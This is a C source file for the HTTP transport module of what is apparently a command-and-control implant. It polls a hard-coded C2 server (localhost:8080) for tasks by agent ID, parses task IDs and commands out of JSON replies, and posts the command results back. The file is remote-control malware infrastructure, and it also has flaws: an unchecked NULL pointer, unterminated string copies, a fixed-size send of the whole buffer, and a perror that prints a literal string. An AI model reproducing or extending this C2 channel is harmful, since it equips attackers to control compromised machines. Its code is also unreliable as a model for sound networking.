#include "transport.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//LinuxAPI
#include <unistd.h>
//network
#include <sys/socket.h> //socket
#include <netinet/in.h> //sockaddr_in
#include <arpa/inet.h> //inet_pton
                       
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

static int current_sockfd = -1; //SOCKET

void error_exit(char* msg) {
    perror("msg");
    exit(EXIT_FAILURE);
}

//if return 0 - success
static int http_init(void) {
    current_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(current_sockfd == -1) {
        return 1;
    }  
    
    struct sockaddr_in addr_server;
    memset(&addr_server, 0, sizeof(addr_server));
    addr_server.sin_family = AF_INET;
    addr_server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr);

    if(connect(current_sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
        return 1;
    }

    printf("[+/HTTP] Initialization success. Connect to c2.\n");
    fflush(stdout);
    sleep(1);

    return 0;
}

//if return 0 - success
//command, task_id - выходные аргументы
static int http_get_command(char* command, char* task_id,  size_t max_len_command, char* agent_id) {
    char buf[2048] = {0};
    snprintf(buf, 
            sizeof(buf),
            "GET /get_task/%s HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "Connection: close\r\n\r\n",
            agent_id);

    if(send(current_sockfd, buf, sizeof(buf), 0) == -1) {
        error_exit("send/HTTP");
    }

    int count_bytes = read(current_sockfd, buf, sizeof(buf) - 1);
    if(count_bytes == -1) {
        error_exit("read/HTTP");
    }

    //for reliability
    buf[count_bytes] = '\0';

    //parse answer for c2(task_id)
    char* body = strstr(buf, "\r\n\r\n");
    if(body != NULL) {
        body += 4;
    }
    body = strchr(body, '\"');
    if(body != NULL) {
        body++;
    }
    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '_' && body[5] == 'i' && body[6] == 'd' && body[7] == '\"') {
        body += 9; 
        if(body[0] == 'n' && body[1] == 'u' && body[2] == 'l' && body[3] == 'l') {
            printf("[+/HTTP] No tasks for working.\n");
            fflush(stdout);
            sleep(1);
            return 1;
        }
        for(int i = 0; i < strlen(body) - 1; ++i) {
            if(body[i] == ',') {
                body[i] = '\0';
                break;
            }
        }
    } else {
        printf("[-/HTTP] Error parse task_id form json.\n");
        return 1;
    }

    if(strlen(body) >= max_len_command) {
        error_exit("command_len/HTTP");
    }
    strncpy(task_id, body, strlen(body));

    //parse answer for c2(command)
    body += (strlen(body) + 2);
    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '\"') {
        body += 7; 
        for(int i = strlen(body) - 1; i >= 0; --i) {
            if(body[i] == '\"') {
                body[i] = '\0';
                break;
            }
        }
    } else {
        printf("[-/HTTP] Error parse task form json.\n");
    }

    strncpy(command, body, strlen(body));

    printf("[HTTP] Получено: %s, %s", task_id, command);

    printf("[+/HTTP] Command fetch from c2 success.\n");
    fflush(stdout);
    sleep(1);

    return 0;
}

void escape_json(char* dst, const char* src, size_t dst_size) {
    size_t i = 0, j = 0;
    for(; src[i] != '\0' && j < dst_size - 1; ++i) {
        switch(src[i]) {
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            case '\"': dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            default: dst[j++] = src[i]; break;
        }
    }
    dst[j] = '\0';
}

//if return 0 - success
static int http_send_result(char* task_id, char* result) {
    if(result[strlen(result) - 1] == '\n') {
        result[strlen(result) - 1] = '\0';
    }
    
    //экранирование
    char escape_result[4096] = {0};
    escape_json(escape_result, result, 4096);

    char body[5000] = {0};
    snprintf(body,
            sizeof(body),
            "{\"task_id\":%s,\"result\":\"%s\"}",
            task_id,
            escape_result);
    int body_len = strlen(body);

    char request[6000] = {0};
    snprintf(request, sizeof(request),
            "POST /send_result HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "Connection: close\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %d\r\n\r\n"
            "%s",
            body_len,
            body);
   
    if(send(current_sockfd, request, strlen(request), 0) == -1) {
        error_exit("send/HTTP");
    }

    printf("[+/HTTP] Send result to c2 success.\n");

    return 0;
}

void http_cleanup(void) {
    close(current_sockfd);
}

//export module
TransportModule http_transport = {
    .name = "HTTP",
    .init = http_init,
    .get_command = http_get_command,
    .send_result = http_send_result,
    .cleanup = http_cleanup
};
